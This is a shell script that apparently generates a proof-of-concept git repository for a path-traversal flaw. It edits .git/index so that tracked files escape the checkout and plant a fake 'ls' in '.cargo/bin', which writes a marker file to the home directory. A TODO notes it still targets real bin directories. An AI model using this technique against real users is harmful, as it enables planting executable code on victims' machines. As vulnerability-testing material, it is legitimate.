#!/bin/sh
# TODO: Before using in tests, limit this to never target real bin dirs!
set -eu

repo="$1"
bin='.cargo/bin'

git init -- "$repo"
cd -- "$repo"

for dir in .a .b .c .d .e .f .g .h .i .j; do
    mkdir -- "$dir"
    touch -- "$dir/.keep"
done

cat >ls.tmp <<'EOF'
#!/bin/sh
printf 'Vulnerable!\n'
date >~/vulnerable
exec /bin/ls "$@"
EOF

upward='..'
for dir in .a .b .c .d .e .f .g .h .i .j; do
    upward="../$upward"  # So .a has ../.., then .b has ../../.., and so on.
    cp -- ls.tmp "$(printf '%s' "$dir/$upward/$bin/ls" | tr / @)"
done

rm ls.tmp
git add .
ex -s -c '%s/@\.\./\/../g' -c 'x' .git/index  # Replace each "@.." with "/..".
git commit -m 'Initial commit'
git show --stat
